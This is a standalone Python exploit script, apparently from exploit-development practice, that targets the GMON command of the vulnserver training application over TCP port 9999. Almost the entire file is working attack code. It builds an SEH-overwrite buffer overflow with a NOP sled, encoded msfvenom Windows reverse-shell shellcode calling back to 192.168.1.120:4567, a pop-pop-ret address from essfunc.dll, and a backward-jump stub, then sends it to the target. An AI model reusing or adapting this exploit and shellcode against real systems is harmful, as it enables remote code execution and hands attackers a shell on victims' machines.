#!/usr/bin/python3
import socket

target = "192.168.1.126"
port = 9999

# nseh offset 3515
payload = b"\x90" * 3000
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00"
payload += b"\xba\xa1\x65\x81\x7d\xda\xc4\xd9\x74\x24\xf4\x5d\x2b\xc9"
payload += b"\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x64\x61\x63\x88\x9a"
payload += b"\x82\xe1\x73\x62\x53\x86\xfa\x87\x62\x86\x99\xcc\xd5\x36"
payload += b"\xe9\x80\xd9\xbd\xbf\x30\x69\xb3\x17\x37\xda\x7e\x4e\x76"
payload += b"\xdb\xd3\xb2\x19\x5f\x2e\xe7\xf9\x5e\xe1\xfa\xf8\xa7\x1c"
payload += b"\xf6\xa8\x70\x6a\xa5\x5c\xf4\x26\x76\xd7\x46\xa6\xfe\x04"
payload += b"\x1e\xc9\x2f\x9b\x14\x90\xef\x1a\xf8\xa8\xb9\x04\x1d\x94"
payload += b"\x70\xbf\xd5\x62\x83\x69\x24\x8a\x28\x54\x88\x79\x30\x91"
payload += b"\x2f\x62\x47\xeb\x53\x1f\x50\x28\x29\xfb\xd5\xaa\x89\x88"
payload += b"\x4e\x16\x2b\x5c\x08\xdd\x27\x29\x5e\xb9\x2b\xac\xb3\xb2"
payload += b"\x50\x25\x32\x14\xd1\x7d\x11\xb0\xb9\x26\x38\xe1\x67\x88"
payload += b"\x45\xf1\xc7\x75\xe0\x7a\xe5\x62\x99\x21\x62\x46\x90\xd9"
payload += b"\x72\xc0\xa3\xaa\x40\x4f\x18\x24\xe9\x18\x86\xb3\x0e\x33"
payload += b"\x7e\x2b\xf1\xbc\x7f\x62\x36\xe8\x2f\x1c\x9f\x91\xbb\xdc"
payload += b"\x20\x44\x6b\x8c\x8e\x37\xcc\x7c\x6f\xe8\xa4\x96\x60\xd7"
payload += b"\xd5\x99\xaa\x70\x7f\x60\x3d\xbf\x28\x6b\xc5\x57\x2b\x6b"
payload += b"\x24\x7f\xa2\x8d\x2c\x6f\xe3\x06\xd9\x16\xae\xdc\x78\xd6"
payload += b"\x64\x99\xbb\x5c\x8b\x5e\x75\x95\xe6\x4c\xe2\x55\xbd\x2e"
payload += b"\xa5\x6a\x6b\x46\x29\xf8\xf0\x96\x24\xe1\xae\xc1\x61\xd7"
payload += b"\xa6\x87\x9f\x4e\x11\xb5\x5d\x16\x5a\x7d\xba\xeb\x65\x7c"
payload += b"\x4f\x57\x42\x6e\x89\x58\xce\xda\x45\x0f\x98\xb4\x23\xf9"
payload += b"\x6a\x6e\xfa\x56\x25\xe6\x7b\x95\xf6\x70\x84\xf0\x80\x9c"
payload += b"\x35\xad\xd4\xa3\xfa\x39\xd1\xdc\xe6\xd9\x1e\x37\xa3\xfa"
payload += b"\xfc\x9d\xde\x92\x58\x74\x63\xff\x5a\xa3\xa0\x06\xd9\x41"
payload += b"\x59\xfd\xc1\x20\x5c\xb9\x45\xd9\x2c\xd2\x23\xdd\x83\xd3"
payload += b"\x61"
payload += b"\x90" * (3515 - len(payload))
# jump forward 6 bytes
payload += b"\xeb\x06\x90\x90"
# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver-master\essfunc.dll)
payload += b"\xb4\x10\x50\x62"
# jump back 768
payload += b"\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"
payload += b"D" * (5000 - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b"GMON /.:/" + payload + b"\n")
s.close()
